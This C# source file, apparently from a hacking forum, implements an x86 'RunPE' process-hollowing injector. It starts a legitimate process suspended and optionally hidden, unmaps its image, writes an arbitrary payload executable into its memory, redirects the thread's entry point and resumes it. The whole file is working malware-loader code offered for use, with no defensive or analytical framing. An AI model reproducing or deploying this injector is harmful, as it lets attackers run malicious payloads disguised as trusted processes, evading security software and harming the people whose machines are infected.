﻿using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace HackForums.gigajew
{
    /// <summary>
    /// Originally by Oppresor, re-created by gigajew without dynamic API or weird names
    /// </summary>
    public static class x86RunPE
    {

        [DllImport("kernel32.dll", EntryPoint = "CreateProcessA", SetLastError = true)]
        private static extern IntPtr CreateProcess(String processName, String commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] Boolean inherit, [MarshalAs(UnmanagedType.I4)] Int32 creation, IntPtr env, String curDir, Byte[] sInfo, IntPtr[] pInfo);

        [DllImport("ntdll.dll", EntryPoint = "NtResumeThread", CharSet = CharSet.Ansi)]
        private static extern IntPtr NtResumeThread(IntPtr hThread, out Int64 suspendCount);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetThreadContext(IntPtr hThread, UInt32[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr SetThreadContext(IntPtr hThread, UInt32[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, ref IntPtr pBuffer, IntPtr bufferSize, [MarshalAs(UnmanagedType.I4)]  ref Int32 lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, Byte[] lpBuffer, [MarshalAs(UnmanagedType.I4)] Int32 bufferSize, [MarshalAs(UnmanagedType.I4)]  ref Int32 lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr dwSize, Int32 dwFlags, Int32 dwProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.I4)]
        private static extern Int32 ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        public static void Inject(String processName, Byte[] payloadBuffer, String arguments = null, Boolean hidden = false)
        {
            String lpProcess = Path.GetFullPath(processName);
            //String lpDirectory = Path.GetDirectoryName(lpProcess);
            String lpDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            Int32 e_lfanew = GetElfanew(payloadBuffer);
            Int32 sizeOfHeaders = GetSizeOfHeaders(payloadBuffer, e_lfanew);
            Int16 numSections = GetNumberOfSections(payloadBuffer, e_lfanew);

            SetSubsystem(payloadBuffer, e_lfanew);

            Byte[] startupInfo = new Byte[0x44];
            IntPtr[] processInfo = new IntPtr[4];
            IntPtr processHandle;
            Int32 processFlags = 0x00000004 | (hidden ? 0x08000000 : 0);

            if ((processHandle = CreateProcess(lpProcess, null, IntPtr.Zero, IntPtr.Zero, false, processFlags, IntPtr.Zero, lpDirectory, startupInfo, processInfo)) != default(IntPtr))
            {
                UInt32[] threadContext = new UInt32[0xb3];
                threadContext[0] = 0x10002; // optional flags, could be 0x10007

                if (GetThreadContext(processInfo[1], threadContext) == default(IntPtr))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                IntPtr baseAddress = (IntPtr)(threadContext[0x29] + 8L); //ebx + 8 (process environment block)
                IntPtr pBuffer = IntPtr.Zero;
                IntPtr pBufferSize = (IntPtr)4;
                Int32 numRead = 0;
                Int32 numWrite = 0;

                if (ReadProcessMemory(processInfo[0], baseAddress, ref pBuffer, pBufferSize, ref numRead) != default(IntPtr) && ZwUnmapViewOfSection(processInfo[0], pBuffer) == 0)
                {
                    IntPtr address = (IntPtr)BitConverter.ToInt32(payloadBuffer, e_lfanew + 0x34);
                    IntPtr size = (IntPtr)BitConverter.ToInt32(payloadBuffer, e_lfanew + 80);

                    // this fails sometimes when there's not enough memory to allocate
                    IntPtr lpBaseAddress = VirtualAllocEx(processInfo[0], address, size, 0x3000, 0x40);
                    if (lpBaseAddress == default(IntPtr))
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }

                    if (WriteProcessMemory(processInfo[0], lpBaseAddress, payloadBuffer, sizeOfHeaders, ref numWrite) != default(IntPtr))
                    {
                        for (Int32 i = 0; i < numSections; i++)
                        {
                            Int32[] sectionHeader = new Int32[10];
                            Buffer.BlockCopy(payloadBuffer, (e_lfanew + 0xf8) + (i * 40), sectionHeader, 0, 40);

                            Byte[] pointerToRawData = new Byte[(sectionHeader[4] - 1) + 1];
                            Buffer.BlockCopy(payloadBuffer, sectionHeader[5], pointerToRawData, Convert.ToInt32(null, 2), pointerToRawData.Length);

                            size = new IntPtr(lpBaseAddress.ToInt32() + sectionHeader[3]);
                            address = new IntPtr(pointerToRawData.Length);
                            WriteProcessMemory(processInfo[0], size, pointerToRawData, address.ToInt32(), ref numWrite);
                        }

                        size = (IntPtr)(threadContext[0x29] + 8L); // ebx + 8 (process environment block)
                        address = (IntPtr)4;

                        WriteProcessMemory(processInfo[0], size, BitConverter.GetBytes(lpBaseAddress.ToInt32()), address.ToInt32(), ref numWrite);
                        threadContext[0x2c] = (UInt32)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(payloadBuffer, e_lfanew + 40)); // update eax (entrypoint)

                        SetThreadContext(processInfo[1], threadContext);
                    }
                    else
                    {
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                    }
                }
                else
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                Int64 suspendCount;
                NtResumeThread(processInfo[1], out suspendCount);
            }
            else
            {
                throw new Win32Exception(Marshal.GetLastWin32Error());
            }
        }

        /// <summary>
        /// Set subsystem GUI, meant to do for process, not payload but whatever
        /// </summary>
        private static void SetSubsystem(Byte[] buffer, Int32 e_lfanew)
        {
            Buffer.SetByte(buffer, e_lfanew + 0x5c, 0x00);
            Buffer.SetByte(buffer, e_lfanew + 0x5c + 1, 0x02);
        }

        /// <summary>
        /// Get number of sections
        /// </summary>
        private static Int16 GetNumberOfSections(Byte[] payloadBuffer, Int32 elfanewOffset)
        {
            Int16 numberOfSections = BitConverter.ToInt16(payloadBuffer, elfanewOffset + 6);
            Int16 reduction = 1;
            return (short)(numberOfSections - reduction);
        }

        /// <summary>
        /// Get size of headers
        /// </summary>
        private static Int32 GetSizeOfHeaders(Byte[] payloadBuffer, Int32 elfanewOffset)
        {
            return BitConverter.ToInt32(payloadBuffer, elfanewOffset + 0x54);
        }

        /// <summary>
        /// Get e_lfanew
        /// </summary>
        private static Int32 GetElfanew(Byte[] payloadBuffer)
        {
            return BitConverter.ToInt32(payloadBuffer, 0x3c);
        }
    }
}